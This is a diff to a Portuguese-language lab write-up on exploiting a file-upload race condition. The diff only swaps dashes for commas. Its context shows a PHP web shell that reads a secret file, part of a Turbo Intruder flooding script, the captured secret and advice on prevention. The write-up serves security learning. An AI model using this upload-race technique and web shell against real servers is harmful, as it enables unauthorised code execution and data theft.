@@ -5,7 +5,7 @@ category: "Race Conditions"
 difficulty: "Practitioner"
 date: 2026-04-15
 techniques: ["File Upload Race", "PHP Web Shell", "RCE"]
-description: "Race em upload de arquivo — a janela entre `move_uploaded_file()` e a validação permite executar uma web shell PHP antes da deleção, escalando pra RCE."
+description: "Race em upload de arquivo, a janela entre `move_uploaded_file()` e a validação permite executar uma web shell PHP antes da deleção, escalando pra RCE."
 lang: pt-br
 translation_key: race-condition-file-upload
 permalink: /writeups/race-condition-file-upload/pt/
@@ -46,7 +46,7 @@ O lab tem uma função de upload de avatar que faz validação no servidor. O fl
 | `/my-account` | GET | Página da conta com formulário de upload |
 
 ### Comportamento da Validação de Upload
-Fazer upload de `.php` retorna **403 Forbidden** com a mensagem "Sorry, only JPG & PNG files are allowed." Porém, o servidor salva o arquivo temporariamente antes de validar e deletar — criando uma janela de race.
+Fazer upload de `.php` retorna **403 Forbidden** com a mensagem "Sorry, only JPG & PNG files are allowed." Porém, o servidor salva o arquivo temporariamente antes de validar e deletar, criando uma janela de race.
 
 ### Código Vulnerável do Servidor
 ```php
@@ -84,13 +84,13 @@ POST /my-account/avatar (exploit.php):
 echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' > /tmp/exploit.php
 ```
 
-2. **Fiz upload do exploit.php** como avatar pelo navegador — recebi 403 "only JPG & PNG files are allowed" como esperado
+2. **Fiz upload do exploit.php** como avatar pelo navegador, recebi 403 "only JPG & PNG files are allowed" como esperado
 
 3. **Capturei o POST /my-account/avatar** no HTTP History do Burp
 
-4. **Enviei pro Turbo Intruder** — botão direito → Extensions → Turbo Intruder → Send to Turbo Intruder
+4. **Enviei pro Turbo Intruder**, botão direito → Extensions → Turbo Intruder → Send to Turbo Intruder
 
-5. **Configurei o script do Turbo Intruder** — 1 upload + 50 GET requests por tentativa, 20 tentativas:
+5. **Configurei o script do Turbo Intruder**, 1 upload + 50 GET requests por tentativa, 20 tentativas:
 
 ```python
 def queueRequests(target, wordlists):
@@ -115,18 +115,18 @@ def handleResponse(req, interesting):
         table.add(req)
 ```
 
-6. **Lancei o ataque** — 20 tentativas × 51 requisições = 1.020 requisições no total
+6. **Lancei o ataque**, 20 tentativas × 51 requisições = 1.020 requisições no total
 
-7. **Análise dos resultados** — várias requisições GET retornaram 200 com Content-Length 32, contendo o secret
+7. **Análise dos resultados**, várias requisições GET retornaram 200 com Content-Length 32, contendo o secret
 
 8. **Extraí o secret:** `8Yn0bj3aISfGVTKF3yNa8o5QY7ndxF6v`
 
-9. **Submeti a solução** — lab solved
+9. **Submeti a solução**, lab solved
 
 ### Resultado
 - **RCE alcançada** via race condition em upload de arquivo
 - **Secret exfiltrado:** `8Yn0bj3aISfGVTKF3yNa8o5QY7ndxF6v`
-- **Múltiplos hits bem-sucedidos** — a janela de race era larga o suficiente para várias requisições GET passarem
+- **Múltiplos hits bem-sucedidos**, a janela de race era larga o suficiente para várias requisições GET passarem
 
 ---
 
@@ -149,7 +149,7 @@ def handleResponse(req, interesting):
 | Conceito | Descrição |
 |---|---|
 | Race Condition em File Upload | Explorar a janela entre o arquivo ser salvo e ser validado/deletado |
-| Anti-Padrão "Salvar-depois-Validar" | Servidor salva o arquivo antes de checar o tipo — qualquer arquivo existe em disco temporariamente |
+| Anti-Padrão "Salvar-depois-Validar" | Servidor salva o arquivo antes de checar o tipo, qualquer arquivo existe em disco temporariamente |
 | Web Shell PHP | Script PHP simples que executa código no servidor: `<?php echo file_get_contents(...); ?>` |
 | GET Flooding em Paralelo | Enviar 50 GETs por tentativa de upload maximiza a chance de pegar a janela de race |
 | RCE via Race Condition | Combinar bypass de upload com race condition alcança Remote Code Execution |
@@ -188,7 +188,7 @@ echo '<?php echo file_get_contents("/home/carlos/secret"); ?>' > /tmp/exploit.ph
 
 Para prevenir race conditions em file upload:
 
-- **Validar antes de salvar:** Checar tipo, extensão e conteúdo ANTES de gravar em disco — nunca salvar e depois validar
+- **Validar antes de salvar:** Checar tipo, extensão e conteúdo ANTES de gravar em disco, nunca salvar e depois validar
 - **Usar diretório temporário:** Fazer upload pra um diretório temporário não acessível pela web, validar lá, e só mover pro diretório público se for válido
 - **Randomizar nomes de arquivo:** Gerar nomes aleatórios no upload pra que atacantes não possam prever a URL durante a janela de race
 - **Move atômico:** Usar processo em duas etapas onde o arquivo só fica acessível depois da validação completar (ex: renomear de `.tmp` pra extensão final)
@@ -198,4 +198,4 @@ Para prevenir race conditions em file upload:
 
 ## Reflexão
 
-Esse lab demonstra como race conditions podem escalar restrições de file upload pra Remote Code Execution completa. O padrão "salvar-depois-validar" do servidor é um anti-padrão comum — cria uma janela onde qualquer tipo de arquivo existe em disco e é acessível via web server. O ataque é direto uma vez que você entende o padrão: bombardear GETs em paralelo com o upload, e pelo menos um vai pegar o arquivo antes da deleção. Em contexto de bug bounty real, isso seria um achado de severidade Crítica (RCE) e provavelmente pagaria o bounty máximo. Esse lab também mostra a interseção de race conditions com outras classes de vulnerabilidade — a restrição de file upload é robusta quando testada sequencialmente, mas completamente burlada via acesso concorrente.
+Esse lab demonstra como race conditions podem escalar restrições de file upload pra Remote Code Execution completa. O padrão "salvar-depois-validar" do servidor é um anti-padrão comum, cria uma janela onde qualquer tipo de arquivo existe em disco e é acessível via web server. O ataque é direto uma vez que você entende o padrão: bombardear GETs em paralelo com o upload, e pelo menos um vai pegar o arquivo antes da deleção. Em contexto de bug bounty real, isso seria um achado de severidade Crítica (RCE) e provavelmente pagaria o bounty máximo. Esse lab também mostra a interseção de race conditions com outras classes de vulnerabilidade, a restrição de file upload é robusta quando testada sequencialmente, mas completamente burlada via acesso concorrente.
